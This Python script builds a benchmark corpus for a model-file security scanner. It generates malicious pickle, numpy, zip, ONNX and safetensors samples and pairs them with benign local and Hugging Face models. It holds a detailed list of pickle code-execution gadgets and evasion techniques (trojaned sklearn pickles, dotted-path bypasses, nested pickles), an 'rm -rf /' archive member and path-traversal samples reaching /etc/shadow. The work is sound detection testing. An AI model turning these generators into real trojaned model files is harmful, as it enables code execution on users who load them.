"""Build the model-file scanner benchmark corpus.

Malicious files are GENERATED here (never downloaded): each payload is a harmless command string, and the
files are only ever scanned, never loaded. Benign files are real public models fetched from the Hugging Face Hub
at pinned revisions, plus locally trained sklearn / torch / numpy / safetensors / ONNX models.

Run from ``backend/``:  python -m research.scanner_bench.build_corpus
Needs: torch, scikit-learn, numpy, safetensors, onnx, huggingface_hub (see research/requirements.txt).
"""
from __future__ import annotations

import bz2
import gzip
import hashlib
import io
import json
import lzma
import os
import pickle
import struct
import zipfile
from pathlib import Path

import numpy as np

ROOT = Path(os.getenv("VERITAS_BENCH_CACHE", Path.home() / ".cache" / "veritas-bench")) / "scanner-corpus"
CMD = "echo veritas-benchmark-payload"   # never executed: files are only scanned

# ── Payload families: (family, module, name, args). args are plain strings/lists ──────────────────────────
PAYLOADS = [
    ("os_system", "os", "system", [CMD]), ("posix_system", "posix", "system", [CMD]), ("nt_system", "nt", "system", [CMD]),
    ("os_popen", "os", "popen", [CMD]), ("os_execv", "os", "execv", ["/bin/sh", ["sh", "-c", CMD]]),
    ("subprocess_popen", "subprocess", "Popen", [CMD]), ("subprocess_check_output", "subprocess", "check_output", [CMD]),
    ("subprocess_run", "subprocess", "run", [CMD]), ("subprocess_call", "subprocess", "call", [CMD]),
    ("builtins_eval", "builtins", "eval", [f"__import__('os').system('{CMD}')"]),
    ("builtins_exec", "builtins", "exec", [f"import os; os.system('{CMD}')"]),
    ("builtins_compile", "builtins", "compile", ["1+1", "x", "eval"]),
    ("builtins_open", "builtins", "open", ["/tmp/veritas-bench-never-written", "w"]),
    ("builtins_import", "builtins", "__import__", ["os"]),
    ("python2_eval", "__builtin__", "eval", [f"__import__('os').system('{CMD}')"]),
    ("runpy", "runpy", "_run_code", ["print(1)", {}]), ("pty_spawn", "pty", "spawn", [CMD]),
    ("webbrowser", "webbrowser", "open", ["http://example.invalid/"]), ("socket", "socket", "create_connection", [["example.invalid", 80]]),
    ("shutil_rmtree", "shutil", "rmtree", ["/nonexistent-veritas-bench"]), ("importlib", "importlib", "import_module", ["os"]),
    ("timeit", "timeit", "timeit", [f"__import__('os').system('{CMD}')"]), ("cprofile", "cProfile", "run", [f"__import__('os').system('{CMD}')"]),
    ("pip_main", "pip", "main", [["download", "veritas-bench-nonexistent"]]), ("ctypes", "ctypes", "CDLL", ["libc.so.6"]),
    ("marshal_loads", "marshal", "loads", ["x"]), ("pickle_loads", "pickle", "loads", ["x"]), ("_pickle_loads", "_pickle", "loads", ["x"]),
    ("torch_load", "torch", "load", ["x"]), ("numpy_load", "numpy", "load", ["x"]),
    ("numpy_runstring", "numpy.testing._private.utils", "runstring", [f"__import__('os').system('{CMD}')", {}]),
    ("platform_popen", "platform", "popen", [CMD]), ("pydoc_pipepager", "pydoc", "pipepager", ["x", "cat"]),
    ("asyncio_shell", "asyncio.subprocess", "create_subprocess_shell", [CMD]),
    ("multiprocessing", "multiprocessing.util", "spawnv_passfds", ["/bin/sh", ["sh", "-c", CMD], []]),
    ("operator_methodcaller", "operator", "methodcaller", ["system", CMD]),
    ("sys_exit", "sys", "exit", ["x"]), ("code_interact", "code", "interact", ["x"]), ("tempfile_mkstemp", "tempfile", "mkstemp", []),
    # gadgets that live inside libraries a model pickle is normally allowed to import
    ("pandas_eval", "pandas.core.computation.eval", "eval", [f"__import__('os').system('{CMD}')"]),
    ("pandas_read_pickle", "pandas", "read_pickle", ["x"]), ("pandas_io_pickle", "pandas.io.pickle", "read_pickle", ["x"]),
    ("sklearn_run_script", "sklearn.utils._testing", "assert_run_python_script_without_output", [CMD]),
    ("torch_hub", "torch.hub", "load", ["x", "y"]), ("torch_jit_load", "torch.jit", "load", ["x"]),
    ("torch_utils_cpp", "torch.utils.cpp_extension", "load_inline", ["x", [CMD]]),
    ("joblib_parallel", "joblib.parallel", "Parallel", []),
    ("numpy_f2py", "numpy.f2py.f2py2e", "run_main", [["x"]]),
]
# Held-out families: written after the scanner's rules were tuned on PAYLOADS and the first benign set, and run once
# before any rule was changed for them. They include dotted attribute paths through allowed libraries, nested
# pickles, and operations absent from the tuning list.
HELDOUT_PAYLOADS = [
    ("subprocess_getoutput", "subprocess", "getoutput", [CMD]), ("os_spawnlp", "os", "spawnlp", [0, "sh", "sh", "-c", CMD]),
    ("os_execl", "os", "execl", ["/bin/sh", "sh", "-c", CMD]), ("os_remove", "os", "remove", ["/nonexistent-veritas-bench"]),
    ("os_kill", "os", "kill", [1, 0]), ("shutil_copy", "shutil", "copy", ["/etc/hostname", "/tmp/veritas-bench-never-written"]),
    ("shutil_move", "shutil", "move", ["/nonexistent-a", "/nonexistent-b"]), ("socket_socket", "socket", "socket", []),
    ("smtplib_smtp", "smtplib", "SMTP", ["example.invalid"]), ("http_client", "http.client", "HTTPConnection", ["example.invalid"]),
    ("urllib_urlopen", "urllib.request", "urlopen", ["http://example.invalid/"]), ("requests_get", "requests", "get", ["http://example.invalid/"]),
    ("ftplib_ftp", "ftplib", "FTP", ["example.invalid"]), ("sqlite3_connect", "sqlite3", "connect", ["/tmp/veritas-bench-never-written.db"]),
    ("zipfile_zipfile", "zipfile", "ZipFile", ["/nonexistent.zip", "w"]), ("tarfile_open", "tarfile", "open", ["/nonexistent.tar", "w"]),
    ("glob_glob", "glob", "glob", ["/etc/*"]), ("io_open", "io", "open", ["/tmp/veritas-bench-never-written", "w"]),
    ("codecs_open", "codecs", "open", ["/tmp/veritas-bench-never-written", "w"]), ("fileinput", "fileinput", "input", ["/etc/hostname"]),
    ("mmap", "mmap", "mmap", [-1, 10]), ("atexit_register", "atexit", "register", ["x"]), ("signal_signal", "signal", "signal", ["x", "y"]),
    ("threading_thread", "threading", "Thread", []), ("types_function", "types", "FunctionType", ["x", {}]),
    ("shelve_open", "shelve", "open", ["/tmp/veritas-bench-never-written"]), ("xmlrpc", "xmlrpc.client", "ServerProxy", ["http://example.invalid/"]),
    ("ssl_wrap", "ssl", "wrap_socket", ["x"]), ("gc_objects", "gc", "get_objects", []), ("inspect_getmembers", "inspect", "getmembers", ["x"]),
    ("atexit_unregister", "atexit", "unregister", ["x"]), ("tempfile_named", "tempfile", "NamedTemporaryFile", []),
    ("pathlib_path", "pathlib", "Path", ["/etc/passwd"]), ("resource_setrlimit", "resource", "setrlimit", [0, [0, 0]]),
    ("sys_modules_pop", "sys", "modules", []), ("ensurepip", "ensurepip", "bootstrap", []),
    ("trace", "trace", "Trace", []), ("venv_create", "venv", "create", ["/tmp/veritas-bench-never-created"]),
    # dotted attribute paths through modules a model pickle is normally allowed to import (pickle protocol 4 resolves "a.b")
    ("dotted_sklearn_os", "sklearn.utils", "os.system", [CMD]), ("dotted_numpy_os", "numpy.lib.utils", "os.popen", [CMD]),
    ("dotted_torch_sys", "torch.nn.modules.module", "sys.exit", ["x"]), ("dotted_sklearn_subprocess", "sklearn.tree", "subprocess.Popen", [CMD]),
    ("dotted_scipy_builtins", "scipy.sparse", "__builtins__.eval", ["1"]), ("dotted_pandas_os", "pandas.core.series", "os.system", [CMD]),
    ("alias_sklearn_os", "sklearn.utils", "os", []), ("alias_sklearn_subprocess", "sklearn.externals", "subprocess", []),
]
WRAPPED = [  # payload through a second call, so the first import looks harmless
    ("getattr_import_chain", b"cbuiltins\ngetattr\n(cbuiltins\n__import__\n(S'os'\ntRS'system'\ntR(S'%s'\ntR." % CMD.encode()),
    ("partial_wrapped", b"cfunctools\npartial\n(cposix\nsystem\nS'%s'\ntR(tR." % CMD.encode()),
    ("reduce_via_copyreg", b"ccopyreg\n_reconstructor\n(cos\nsystem\nc__builtin__\nobject\nNtR."),
    ("inst_opcode", b"(S'%s'\nios\nsystem\n." % CMD.encode()),
    ("obj_opcode", b"(cos\nsystem\nS'%s'\no." % CMD.encode()),
]


def _py(v) -> bytes:
    """Protocol-0 literal for strings / lists / dicts / None."""
    if isinstance(v, str):
        return b"S" + repr(v).encode() + b"\n"
    if isinstance(v, list):
        return b"(" + b"".join(_py(x) for x in v) + b"l"
    if isinstance(v, dict):
        return b"(d"
    return b"N"


def proto0(module: str, name: str, args: list) -> bytes:
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n(" + b"".join(_py(a) for a in args) + b"tR."


def _bin_str(s: str) -> bytes:
    b = s.encode()
    return b"\x8c" + bytes([len(b)]) + b + b"\x94"            # SHORT_BINUNICODE + MEMOIZE


def proto4(module: str, name: str, args: list) -> bytes:
    """Protocol 4 with STACK_GLOBAL, memoised strings and BINGET re-use (the usual evasion shape)."""
    def val(v):
        if isinstance(v, str):
            return _bin_str(v)
        if isinstance(v, list):
            return b"(" + b"".join(val(x) for x in v) + b"l\x94"
        if isinstance(v, dict):
            return b"}\x94"
        return b"N"
    return (b"\x80\x04" + _bin_str(module) + _bin_str(name) + b"\x93\x94(" + b"".join(val(a) for a in args) + b"t\x94R\x94.")


def trojan(original: bytes, payload: bytes) -> bytes:
    """Run ``payload`` first, discard its result (POP), then continue as the original protocol-2 pickle."""
    assert original[:2] == b"\x80\x02" and payload.endswith(b".")
    return b"\x80\x02" + payload[:-1] + b"0" + original[2:]


def malicious_variants(family: str, p0: bytes, p4: bytes, real: bytes | None, clean: bytes) -> list[tuple[str, str, bytes]]:
    """(variant, filename, bytes)"""
    out = [("raw_p0", f"{family}__raw_p0.pkl", p0), ("raw_p4", f"{family}__raw_p4.pkl", p4),
           ("trojaned_sklearn", f"{family}__trojan.pkl", trojan(clean, p0)),
           ("appended_after_clean", f"{family}__appended.pkl", pickle.dumps({"w": [1, 2, 3]}, protocol=2) + p0),
           ("gzip_joblib", f"{family}__gz.joblib", gzip.compress(p4)),
           ("xz_wrapped", f"{family}__xz.pkl", lzma.compress(p4)),
           ("torch_zip", f"{family}__torch.pt", _zip({"archive/data.pkl": p4, "archive/version": b"3\n", "archive/byteorder": b"little"}))]
    if real is not None:
        out.append(("raw_real_p5", f"{family}__raw_p5.pkl", real))
    return out


def _zip(members: dict[str, bytes]) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for k, v in members.items():
            z.writestr(k, v)
    return b.getvalue()


def build_malicious(dest: Path, clean_proto2: bytes) -> list[dict]:
    items = []
    split = "dev"

    def add(family, variant, name, data, extra=""):
        path = dest / name
        path.write_bytes(data)
        items.append({"path": str(path.relative_to(ROOT)), "label": "malicious", "family": family, "variant": variant, "note": extra, "split": split})

    for family, module, name, args in PAYLOADS:
        p0, p4 = proto0(module, name, args), proto4(module, name, args)
        for variant, fname, data in malicious_variants(family, p0, p4, None, clean_proto2):
            add(family, variant, fname, data)
    split = "heldout"
    for family, module, name, args in HELDOUT_PAYLOADS:
        p0, p4 = proto0(module, name, args), proto4(module, name, args)
        for variant, fname, data in malicious_variants(family, p0, p4, None, clean_proto2):
            add(family, variant, fname, data)
    # nested pickle: torch.storage._load_from_bytes(<pickle bytes>) unpickles its argument
    inner = proto0("os", "system", [CMD])
    nested = b"\x80\x04" + _bin_str("torch.storage") + _bin_str("_load_from_bytes") + b"\x93\x94C" + bytes([len(inner)]) + inner + b"\x85\x94R\x94."
    for variant, fname, data in malicious_variants("torch_load_from_bytes", nested, nested, None, clean_proto2):
        add("torch_load_from_bytes", variant, fname, data)
    # hand-built opcode shapes: import kept in the memo and fetched with GET
    memo_global = b"cos\nsystem\np0\n0g0\n(S'%s'\ntR." % CMD.encode()
    frames = b"\x80\x05\x95\x20\x00\x00\x00\x00\x00\x00\x00" + _bin_str("os") + _bin_str("system") + b"\x93\x94" + _bin_str(CMD) + b"\x85\x94R."
    for fam, p in (("memoized_global", memo_global), ("proto5_frame", frames)):
        for variant, fname, data in malicious_variants(fam, p, p, None, clean_proto2)[:5]:
            add(fam, variant, fname, data)
    split = "dev"
    for family, p0 in WRAPPED:
        for variant, fname, data in malicious_variants(family, p0, p0, None, clean_proto2)[:5]:
            add(family, variant, fname, data)

    # object-dtype arrays are pickles inside .npy / .npz
    class _Boom:
        def __reduce__(self):
            return (os.system, (CMD,))
    arr = np.empty(1, dtype=object)
    arr[0] = _Boom()
    b = io.BytesIO(); np.save(b, arr, allow_pickle=True)
    add("npy_object_array", "npy", "npy_object__a.npy", b.getvalue())
    z = io.BytesIO(); np.savez(z, a=arr)
    add("npz_object_array", "npz", "npz_object__a.npz", z.getvalue())
    # archives carrying code, and malformed safe formats
    add("zip_executable_member", "zip", "zip_exec__m.zip", _zip({"model/weights.npy": b"x", "model/run.sh": b"rm -rf /"}))
    add("zip_so_member", "zip", "zip_so__m.pt", _zip({"archive/data.pkl": pickle.dumps({"a": 1}, protocol=2), "archive/ext.so": b"\x7fELF"}))
    add("keras_lambda", "keras", "keras_lambda__m.keras", _zip({"config.json": json.dumps({"config": {"layers": [{"class_name": "Lambda", "config": {"function": "x"}}]}}).encode(), "metadata.json": b"{}"}))
    add("onnx_external_traversal", "onnx", "onnx_traversal__m.onnx", _onnx_bytes(external="../../../etc/passwd"))
    add("onnx_external_absolute", "onnx", "onnx_absolute__m.onnx", _onnx_bytes(external="/etc/shadow"))
    add("onnx_custom_op", "onnx", "onnx_customop__m.onnx", _onnx_bytes(domain="com.evil.ops"))
    hdr = json.dumps({"w": {"dtype": "F32", "shape": [2], "data_offsets": [0, 800]}}).encode()
    add("safetensors_bad_offsets", "safetensors", "st_badoffsets__m.safetensors", struct.pack("<Q", len(hdr)) + hdr + b"\0" * 8)
    add("safetensors_huge_header", "safetensors", "st_hugeheader__m.safetensors", struct.pack("<Q", 10 ** 12) + b"{" + b"\0" * 64)
    return items


def _pb(field, wire, payload):
    def varint(n):
        out = b""
        while True:
            c = n & 0x7F; n >>= 7
            out += bytes([c | (0x80 if n else 0)])
            if not n:
                return out
    key = varint(field << 3 | wire)
    return key + (varint(len(payload)) + payload if wire == 2 else varint(payload))


def _onnx_bytes(domain="", external=None) -> bytes:
    node = _pb(4, 2, b"Relu") + (_pb(7, 2, domain.encode()) if domain else b"")
    graph = _pb(1, 2, node)
    if external:
        graph += _pb(5, 2, _pb(13, 2, _pb(1, 2, b"location") + _pb(2, 2, external.encode())))
    return _pb(1, 0, 8) + _pb(7, 2, graph)


# ── Benign, local ───────────────────────────────────────────────────────────────────────────────────────
def build_benign_local(dest: Path) -> list[dict]:
    import joblib
    import torch
    from safetensors.numpy import save as st_save
    from sklearn import cluster, decomposition, ensemble, feature_extraction, linear_model, naive_bayes, neighbors, pipeline
    from sklearn import preprocessing, svm, tree, compose, calibration, model_selection, neural_network, impute, feature_selection

    items = []

    def add(name, data, family):
        (dest / name).write_bytes(data)
        items.append({"path": str((dest / name).relative_to(ROOT)), "label": "benign", "family": family, "variant": "local", "note": "", "split": "dev"})

    rng = np.random.RandomState(0)
    X, y = rng.rand(200, 6), (rng.rand(200) > 0.5).astype(int)
    texts = ["good movie", "bad film", "great plot", "awful acting", "fine story", "terrible end"] * 10
    models = {
        "logreg": linear_model.LogisticRegression(), "ridge": linear_model.Ridge(), "sgd": linear_model.SGDClassifier(),
        "svc": svm.SVC(probability=True), "linsvc": svm.LinearSVC(), "tree": tree.DecisionTreeClassifier(),
        "rf": ensemble.RandomForestClassifier(n_estimators=5), "gbm": ensemble.GradientBoostingClassifier(n_estimators=5),
        "hgb": ensemble.HistGradientBoostingClassifier(max_iter=5), "extra": ensemble.ExtraTreesClassifier(n_estimators=5),
        "ada": ensemble.AdaBoostClassifier(n_estimators=5), "knn": neighbors.KNeighborsClassifier(), "gnb": naive_bayes.GaussianNB(),
        "mlp": neural_network.MLPClassifier(max_iter=30), "kmeans": cluster.KMeans(3, n_init=3), "pca": decomposition.PCA(3),
        "scaler_lr": pipeline.make_pipeline(preprocessing.StandardScaler(), linear_model.LogisticRegression()),
        "impute_rf": pipeline.make_pipeline(impute.SimpleImputer(), ensemble.RandomForestClassifier(n_estimators=3)),
        "select_svc": pipeline.make_pipeline(feature_selection.SelectKBest(k=3), svm.SVC()),
        "calibrated": calibration.CalibratedClassifierCV(linear_model.LogisticRegression(), cv=3),
        "gridsearch": model_selection.GridSearchCV(linear_model.LogisticRegression(), {"C": [0.1, 1]}, cv=3),
        "column_transformer": pipeline.make_pipeline(compose.ColumnTransformer([("s", preprocessing.StandardScaler(), [0, 1]), ("p", "passthrough", [2, 3, 4, 5])]), linear_model.LogisticRegression()),
        "voting": ensemble.VotingClassifier([("a", linear_model.LogisticRegression()), ("b", tree.DecisionTreeClassifier())]),
        "stacking": ensemble.StackingClassifier([("a", linear_model.LogisticRegression()), ("b", tree.DecisionTreeClassifier())], cv=3),
    }
    for name, m in models.items():
        m.fit(X, y) if name != "kmeans" and name != "pca" else m.fit(X)
        add(f"sk_{name}.pkl", pickle.dumps(m, protocol=4), "sklearn")
        add(f"sk_{name}_p2.pkl", pickle.dumps(m, protocol=2), "sklearn")
    tfidf = pipeline.make_pipeline(feature_extraction.text.TfidfVectorizer(), linear_model.LogisticRegression()).fit(texts, [i % 2 for i in range(len(texts))])
    add("sk_tfidf.pkl", pickle.dumps(tfidf, protocol=4), "sklearn")
    # joblib in all its compressions
    for c, label in ((0, "plain"), (3, "zlib3"), (("gzip", 3), "gzip"), (("bz2", 3), "bz2"), (("lzma", 3), "lzma"), (("xz", 3), "xz")):
        b = io.BytesIO(); joblib.dump(models["rf"], b, compress=c)
        add(f"joblib_{label}.joblib", b.getvalue(), "joblib")
    # torch
    net = torch.nn.Sequential(torch.nn.Linear(6, 8), torch.nn.ReLU(), torch.nn.Linear(8, 2))
    for new, label in ((True, "zip"), (False, "legacy")):
        b = io.BytesIO(); torch.save(net.state_dict(), b, _use_new_zipfile_serialization=new)
        add(f"torch_state_dict_{label}.pt", b.getvalue(), "torch_state_dict")
    b = io.BytesIO(); torch.save({"model": net.state_dict(), "epoch": 3, "optimizer": torch.optim.Adam(net.parameters()).state_dict()}, b)
    add("torch_checkpoint.pth", b.getvalue(), "torch_checkpoint")
    b = io.BytesIO(); torch.save(net, b)
    add("torch_full_module.pt", b.getvalue(), "torch_full_module")   # pickles torch.nn classes by reference
    b = io.BytesIO(); torch.jit.save(torch.jit.script(net), b)
    add("torchscript.pt", b.getvalue(), "torchscript")
    # numpy / safetensors / onnx
    b = io.BytesIO(); np.save(b, rng.rand(10, 4)); add("array.npy", b.getvalue(), "npy")
    b = io.BytesIO(); np.savez(b, a=rng.rand(5), b=rng.rand(3, 3)); add("arrays.npz", b.getvalue(), "npz")
    b = io.BytesIO(); np.savez_compressed(b, a=rng.rand(50)); add("arrays_c.npz", b.getvalue(), "npz")
    add("local.safetensors", st_save({"w": rng.rand(4, 4).astype(np.float32), "b": rng.rand(4).astype(np.float32)}, metadata={"fmt": "pt"}), "safetensors")
    import onnx
    from onnx import TensorProto, helper
    g = helper.make_graph([helper.make_node("Relu", ["x"], ["y"])], "g", [helper.make_tensor_value_info("x", TensorProto.FLOAT, [1, 3])], [helper.make_tensor_value_info("y", TensorProto.FLOAT, [1, 3])])
    add("local.onnx", onnx.helper.make_model(g).SerializeToString(), "onnx")
    return items


# ── Benign, real public models ──────────────────────────────────────────────────────────────────────────
SELECTION = Path(__file__).parent / "hf_selection.json"
HF_PLANS = [("sklearn", (".pkl", ".joblib", ".pickle"), 8_000_000, 30), ("onnx", (".onnx",), 8_000_000, 16),
            ("gguf", (".gguf",), 12_000_000, 4), ("pytorch", (".bin", ".pt", ".pth"), 30_000_000, 16),
            ("safetensors", (".safetensors",), 30_000_000, 16)]
HELDOUT_EXTRA = {"sklearn": 40, "onnx": 8, "gguf": 2, "pytorch": 20, "safetensors": 8}


def _discover(api, taken: set[str], lib: str, exts: tuple, cap: int, want: int, split: str) -> list[dict]:
    out = []
    for m in api.list_models(filter=lib, sort="downloads", limit=1500):
        if len(out) >= want:
            break
        if m.id in taken:
            continue
        try:
            info = api.model_info(m.id, files_metadata=True)
        except Exception:
            continue
        files = [x for x in info.siblings if x.rfilename.lower().endswith(exts) and x.size and 1000 < x.size < cap
                 and not x.rfilename.endswith(("optimizer.pt", "scheduler.pt", "training_args.bin", "rng_state.pth"))]
        if files:
            out.append({"repo": m.id, "revision": info.sha, "filename": files[0].rfilename, "sha256": None, "family": f"hf_{lib}", "split": split})
            taken.add(m.id)
    return out


def build_benign_hf(dest: Path) -> list[dict]:
    """Fetch the pinned files in hf_selection.json. If it has no held-out files yet, choose them now (repos not
    already used, further down the download ranking) and write them back, so later runs are identical."""
    from huggingface_hub import HfApi, hf_hub_download
    sel = json.loads(SELECTION.read_text())
    if not any(f["split"] == "heldout" for f in sel["files"]):
        api, taken = HfApi(), {f["repo"] for f in sel["files"]}
        for lib, exts, cap, _ in HF_PLANS:
            sel["files"] += _discover(api, taken, lib, exts, cap, HELDOUT_EXTRA[lib], "heldout")
    items = []
    for f in sel["files"]:
        try:
            local = hf_hub_download(f["repo"], f["filename"], revision=f["revision"], local_dir=dest / "_hf" / f["repo"].replace("/", "__"))
        except Exception as exc:
            print(f"  skipped {f['repo']}: {type(exc).__name__}", flush=True)
            continue
        data = Path(local).read_bytes()
        digest = hashlib.sha256(data).hexdigest()
        if f["sha256"] and f["sha256"] != digest:
            raise RuntimeError(f"{f['repo']}/{f['filename']} changed since it was pinned")
        f["sha256"] = digest
        name = f"hf__{f['repo'].replace('/', '__')}__{Path(f['filename']).name}"
        (dest / name).write_bytes(data)
        items.append({"path": str((dest / name).relative_to(ROOT)), "label": "benign", "family": f["family"], "variant": "huggingface",
                      "note": f"{f['repo']}@{f['revision']} {f['filename']} sha256={digest}", "split": f["split"]})
    SELECTION.write_text(json.dumps(sel, indent=1))
    return items


def main() -> None:
    for d in ("malicious", "benign"):
        (ROOT / d).mkdir(parents=True, exist_ok=True)
    clean = pickle.dumps(__import__("sklearn.linear_model", fromlist=["x"]).LogisticRegression().fit([[0, 0], [1, 1]], [0, 1]), protocol=2)
    items = build_malicious(ROOT / "malicious", clean)
    print(f"malicious: {len(items)}", flush=True)
    items += build_benign_local(ROOT / "benign")
    items += build_benign_hf(ROOT / "benign")
    manifest = {"corpus": "veritas-scanner-bench-v1", "n_malicious": sum(i["label"] == "malicious" for i in items),
                "n_benign": sum(i["label"] == "benign" for i in items), "items": items}
    (ROOT / "manifest.json").write_text(json.dumps(manifest, indent=1))
    print(json.dumps({k: v for k, v in manifest.items() if k != "items"}))


if __name__ == "__main__":
    main()
